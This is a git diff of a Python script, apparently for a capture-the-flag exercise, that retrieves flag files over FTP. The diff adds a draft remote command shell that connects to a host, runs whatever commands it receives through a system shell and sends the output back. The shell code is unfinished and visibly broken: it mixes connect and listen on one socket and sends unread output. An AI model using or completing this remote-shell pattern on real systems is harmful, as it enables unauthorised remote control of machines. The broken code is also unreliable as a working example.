@@ -26,9 +26,9 @@ def Mino_ftp_engine():
 
          conn.retrbinary("RETR " + fn, open(fn, 'wb').write)
           with open('flag.txt', 'r') as fp:
-              open_f = fp.read()
-              print("First flag: ", open_f)
-              fp.close()
+               open_f = fp.read()
+               print("First flag: ", open_f)
+               fp.close()
          conn.quit()
 
 Mino_ftp_engine()
@@ -46,13 +46,30 @@ def Mino_web_engine_login():
 Mino_web_engine_login()
 
 '''
-This is taking me longer then i expected.
-Hopefully this wont be a pain in the ass.
-'''
+Mino_shell_S(): 
+  
+   #start here
 
-Mino_establish_shell():
+Mino_shell_S()         \
+                         ---- Both are partially done. One needs something in it while the other needs to be tested
+Mino_shell_C():        /
     
-    #Start here
-    
-    
-Mino_establish_shell()
+    with socket.socket(AF_INET, SOCK_STREAM) as s:
+         s.connect(Host, Port)
+         s.listen(1)
+         conn, addr = s.accept()
+            
+         while True:
+             tk = s.recv(1024)
+             
+             if 'kill' in tk:
+                s.close()
+                break
+                
+             else:
+                SP = subprocess.Popen(tk, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                s.send(SP.stdout.read)
+                s.send(SP.stderr.read)
+                
+Mino_shell_C()
+'''
